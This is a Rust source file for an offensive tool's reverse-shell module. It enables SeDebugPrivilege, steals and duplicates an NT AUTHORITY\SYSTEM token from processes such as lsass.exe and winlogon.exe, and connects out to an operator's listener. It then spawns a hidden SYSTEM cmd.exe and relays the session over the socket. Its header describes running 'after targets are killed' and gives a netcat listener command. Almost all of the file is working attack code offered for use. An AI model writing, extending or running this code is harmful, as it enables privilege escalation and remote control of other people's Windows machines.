//! Reverse-shell module
//!
//! Flow after targets are killed:
//!   1. Walk the process list for a stable SYSTEM-context process (winlogon,
//!      wininit, services).
//!   2. OpenProcess -> OpenProcessToken -> DuplicateTokenEx (primary token).
//!   3. TCP-connect to the operator's listener.
//!   4. Make the socket handle inheritable, then CreateProcessWithTokenW to
//!      spawn cmd.exe with the SYSTEM token, wiring its stdin/stdout/stderr
//!      to the socket.
//!   5. Block on WaitForSingleObject until the interactive session closes.
//!
//! Operator side (any netcat-compatible listener):
//!   nc -lvnp <port>

use std::io::{Read, Write};
use std::mem;
use std::net::TcpStream;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;

use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::{CloseHandle, HANDLE, HANDLE_FLAGS, LUID, SetHandleInformation};
use windows::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, LookupPrivilegeValueW, SECURITY_ATTRIBUTES,
    SecurityImpersonation, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY, TokenPrimary,
};
use windows::Win32::Storage::FileSystem::{ReadFile, WriteFile};
use windows::Win32::System::Pipes::CreatePipe;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    CREATE_PROCESS_LOGON_FLAGS, CreateProcessWithTokenW, GetCurrentProcess, OpenProcess,
    OpenProcessToken, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
    PROCESS_QUERY_LIMITED_INFORMATION, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW,
    WaitForSingleObject,
};

const INFINITE: u32 = 0xFFFF_FFFF;



// ── Privilege helpers ─────────────────────────────────────────────────────────

/// Enable SeDebugPrivilege on the current process token.
///
/// Without this, even a high-integrity (admin) process gets Access Denied
/// when calling OpenProcess on SYSTEM-integrity processes like winlogon.exe.
fn enable_debug_privilege() -> Result<(), String> {
    let mut token = HANDLE::default();
    unsafe {
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        )
    }
    .map_err(|e| format!("OpenProcessToken(self): {e}"))?;

    let priv_name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
    let mut luid = LUID::default();
    unsafe { LookupPrivilegeValueW(None, PCWSTR(priv_name.as_ptr()), &mut luid) }
        .map_err(|e| { unsafe { let _ = CloseHandle(token); } format!("LookupPrivilegeValue: {e}") })?;

    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    unsafe { AdjustTokenPrivileges(token, false, Some(&tp), 0, None, None) }
        .map_err(|e| { unsafe { let _ = CloseHandle(token); } format!("AdjustTokenPrivileges: {e}") })?;

    unsafe { let _ = CloseHandle(token); }
    Ok(())
}

// ── Token theft ───────────────────────────────────────────────────────────────

/// SYSTEM process candidates in priority order.
/// Ordered from most accessible to least: services/lsass are generally
/// not PPL-protected; winlogon/wininit can be restricted on Windows 11.
const SYSTEM_PROCS: &[&str] = &[
    "services.exe",  // Service Control Manager  – always SYSTEM, reliably openable
    "lsass.exe",     // Local Security Authority  – SYSTEM, openable with SeDebugPrivilege
    "spoolsv.exe",   // Print Spooler             – SYSTEM, rarely protected
    "svchost.exe",   // many SYSTEM instances      – broadest coverage
    "wininit.exe",   // Windows Initialization
    "winlogon.exe",  // Windows Logon             – may be PPL on Win11
];

/// Collect (name, pid) for every process whose name is in SYSTEM_PROCS.
/// Returns all matches so steal_system_token can try each in order.
fn find_system_pids() -> Vec<(String, u32)> {
    let mut result = Vec::new();
    let snap = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(h) => h,
        Err(_) => return result,
    };
    let mut e = PROCESSENTRY32W {
        dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };
    if unsafe { Process32FirstW(snap, &mut e) }.is_err() {
        unsafe { let _ = CloseHandle(snap); }
        return result;
    }
    loop {
        let name = String::from_utf16_lossy(
            &e.szExeFile[..e.szExeFile
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(e.szExeFile.len())],
        )
        .to_lowercase();
        if SYSTEM_PROCS.iter().any(|&p| name == p) {
            result.push((name, e.th32ProcessID));
        }
        if unsafe { Process32NextW(snap, &mut e) }.is_err() {
            break;
        }
    }
    unsafe { let _ = CloseHandle(snap); }
    result
}

/// Try to open `pid` and duplicate its primary token.
/// Attempts PROCESS_QUERY_LIMITED_INFORMATION first (works since Vista,
/// sufficient for OpenProcessToken), then falls back to PROCESS_QUERY_INFORMATION.
fn try_steal_from_pid(pid: u32) -> Result<HANDLE, String> {
    // Try the lighter access right first — some PPL processes still
    // allow QUERY_LIMITED even when QUERY_INFORMATION is blocked.
    let proc_h = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) }
        .or_else(|_| unsafe { OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) })
        .map_err(|e| format!("OpenProcess({pid}): {e}"))?;

    let mut raw_tok = HANDLE::default();
    unsafe { OpenProcessToken(proc_h, TOKEN_DUPLICATE | TOKEN_QUERY, &mut raw_tok) }.map_err(|e| {
        unsafe { let _ = CloseHandle(proc_h); }
        format!("OpenProcessToken({pid}): {e}")
    })?;
    unsafe { let _ = CloseHandle(proc_h); }

    let mut sys_tok = HANDLE::default();
    unsafe {
        DuplicateTokenEx(
            raw_tok,
            TOKEN_ALL_ACCESS,
            None,
            SecurityImpersonation,
            TokenPrimary,
            &mut sys_tok,
        )
    }
    .map_err(|e| {
        unsafe { let _ = CloseHandle(raw_tok); }
        format!("DuplicateTokenEx({pid}): {e}")
    })?;
    unsafe { let _ = CloseHandle(raw_tok); }
    Ok(sys_tok)
}

/// Iterate every SYSTEM-context process candidate and return the first
/// successfully duplicated primary token.  Caller must close the handle.
pub fn steal_system_token() -> Result<HANDLE, String> {
    // SeDebugPrivilege allows opening SYSTEM-integrity processes.
    enable_debug_privilege().map_err(|e| format!("SeDebugPrivilege: {e}"))?;
    println!("[shell] SeDebugPrivilege enabled");

    let candidates = find_system_pids();
    if candidates.is_empty() {
        return Err("no SYSTEM process candidates found in process list".to_string());
    }

    for (name, pid) in &candidates {
        print!("[shell] trying {name} (PID {pid}) ... ");
        match try_steal_from_pid(*pid) {
            Ok(tok) => {
                println!("ok");
                println!("[shell] NT AUTHORITY\\SYSTEM token acquired from {name} ({pid})");
                return Ok(tok);
            }
            Err(e) => println!("failed: {e}"),
        }
    }

    Err("all SYSTEM process candidates exhausted — token theft failed".to_string())
}

// ── Reverse shell ─────────────────────────────────────────────────────────────

/// HANDLE wrapper that is safe to send across threads.
/// Stores the pointer value as usize (which is Send) and reconstructs
/// HANDLE on use inside the thread.
struct SendHandle(usize);
unsafe impl Send for SendHandle {}
impl SendHandle {
    fn new(h: HANDLE) -> Self { Self(h.0 as usize) }
    fn handle(&self) -> HANDLE { HANDLE(self.0 as *mut core::ffi::c_void) }
}

/// Create an anonymous pipe. Both ends start inheritable; caller must
/// call SetHandleInformation to clear HANDLE_FLAG_INHERIT on whichever
/// end it keeps (i.e. the end NOT passed to the child process).
fn make_pipe() -> Result<(HANDLE, HANDLE), String> {
    let sa = SECURITY_ATTRIBUTES {
        nLength:              mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle:       windows::core::BOOL(1),  // TRUE
    };
    let (mut r, mut w) = (HANDLE::default(), HANDLE::default());
    unsafe { CreatePipe(&mut r, &mut w, Some(&sa), 0) }
        .map_err(|e| format!("CreatePipe: {e}"))?;
    Ok((r, w))
}

/// TCP-connect to `host:port`, then spawn `cmd` as NT AUTHORITY\SYSTEM
/// using anonymous pipes for its stdio, relayed to/from the socket in
/// background threads. Far more stable than the socket-as-handle method.
///
/// Blocks until the child process exits.
pub fn reverse_shell(host: &str, port: u16, cmd: &str, system_token: HANDLE) -> Result<(), String> {
    // ── Pipes ────────────────────────────────────────────────────────────────
    // stdin  pipe: WE write (stdin_wr), child reads  (stdin_rd  – inheritable)
    // stdout pipe: child writes (stdout_wr – inheritable), WE read (stdout_rd)
    let (stdin_rd,  stdin_wr)  = make_pipe()?;
    let (stdout_rd, stdout_wr) = make_pipe()?;

    // Clear HANDLE_FLAG_INHERIT on the ends we keep so the child doesn't
    // inherit them (avoids broken-pipe deadlocks).
    unsafe {
        let _ = SetHandleInformation(stdin_wr,  1u32, HANDLE_FLAGS(0));
        let _ = SetHandleInformation(stdout_rd, 1u32, HANDLE_FLAGS(0));
    }

    // ── TCP connect ──────────────────────────────────────────────────────────
    let addr = format!("{host}:{port}");
    println!("[shell] connecting to {addr} ...");
    let stream = TcpStream::connect(&addr)
        .map_err(|e| format!("connect({addr}): {e}"))?;
    stream.set_nodelay(true).ok();
    println!("[shell] connected -- launching NT AUTHORITY\\SYSTEM {cmd}");

    // ── Spawn SYSTEM process ─────────────────────────────────────────────────
    let mut cmd_line: Vec<u16> = format!("{cmd}\0").encode_utf16().collect();
    let si = STARTUPINFOW {
        cb:           mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags:      STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW, // SW_HIDE = 0: suppress console window
        wShowWindow:  0, // SW_HIDE
        hStdInput:    stdin_rd,   // child reads from our pipe
        hStdOutput:   stdout_wr,  // child writes to our pipe
        hStdError:    stdout_wr,  // stderr merged into stdout
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    unsafe {
        CreateProcessWithTokenW(
            system_token,
            CREATE_PROCESS_LOGON_FLAGS(0), // no profile load – more stable than LOGON_WITH_PROFILE
            None,
            Some(PWSTR(cmd_line.as_mut_ptr())),
            PROCESS_CREATION_FLAGS(0), // no CREATE_NO_WINDOW: cmd.exe needs a console to stay interactive
            None, None,
            &si, &mut pi,
        )
    }
    .map_err(|e| format!("CreateProcessWithTokenW: {e}"))?;

    // Close child-side pipe ends – we no longer need them after handoff.
    unsafe {
        let _ = CloseHandle(stdin_rd);
        let _ = CloseHandle(stdout_wr);
    }

    println!("[shell] SYSTEM shell live -- PID {} ({cmd}) -- session open", pi.dwProcessId);

    // ── Relay threads ────────────────────────────────────────────────────────
    let done = Arc::new(AtomicBool::new(false));

    // Thread 1: socket -> child stdin pipe
    {
        let mut sock = stream.try_clone().map_err(|e| format!("try_clone: {e}"))?;
        let pipe     = SendHandle::new(stdin_wr);
        let done1    = done.clone();
        thread::spawn(move || {
            let mut buf = [0u8; 4096];
            loop {
                if done1.load(Ordering::SeqCst) { break; }
                match sock.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        let mut wr = 0u32;
                        if unsafe {
                            WriteFile(pipe.handle(), Some(&buf[..n]), Some(&mut wr), None)
                        }.is_err() { break; }
                    }
                }
            }
            done1.store(true, Ordering::SeqCst);
            unsafe { let _ = CloseHandle(pipe.handle()); }
        });
    }

    // Thread 2: child stdout pipe -> socket
    {
        let mut sock = stream.try_clone().map_err(|e| format!("try_clone: {e}"))?;
        let pipe     = SendHandle::new(stdout_rd);
        let done2    = done.clone();
        thread::spawn(move || {
            let mut buf = [0u8; 4096];
            loop {
                if done2.load(Ordering::SeqCst) { break; }
                let mut rd = 0u32;
                match unsafe {
                    ReadFile(pipe.handle(), Some(&mut buf), Some(&mut rd), None)
                } {
                    Err(_)      => break,   // broken pipe = child exited
                    Ok(()) if rd == 0 => break,
                    Ok(()) => {
                        if sock.write_all(&buf[..rd as usize]).is_err() { break; }
                        let _ = sock.flush();
                    }
                }
            }
            done2.store(true, Ordering::SeqCst);
            unsafe { let _ = CloseHandle(pipe.handle()); }
        });
    }

    // Wait for the child process to exit naturally.
    unsafe { WaitForSingleObject(pi.hProcess, INFINITE); }
    done.store(true, Ordering::SeqCst);
    unsafe {
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);
    }
    drop(stream);
    println!("[shell] session closed");
    Ok(())
}
